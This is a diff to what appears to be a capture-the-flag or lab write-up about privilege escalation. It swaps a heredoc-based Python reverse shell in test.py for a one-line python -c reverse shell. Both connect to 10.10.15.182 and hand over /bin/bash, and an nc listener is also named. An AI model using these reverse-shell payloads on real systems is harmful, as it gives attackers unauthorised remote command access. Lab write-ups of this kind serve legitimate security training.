@@ -195,17 +195,14 @@ nc -lvnp 5555
 
 The `test.py` script was then overwritten with a Python reverse shell payload:
 
+<details>
+<summary>Python Reverse Shell Payload</summary>
+
 ```bash
-cat > test.py << 'EOF'
-import socket,subprocess,os
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("10.10.15.182",5555))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-subprocess.call(["/bin/bash","-i"])
-EOF
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.182",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'
 ```
+
+</details>
 
 
 <img src="images/privesc.png" width="600">
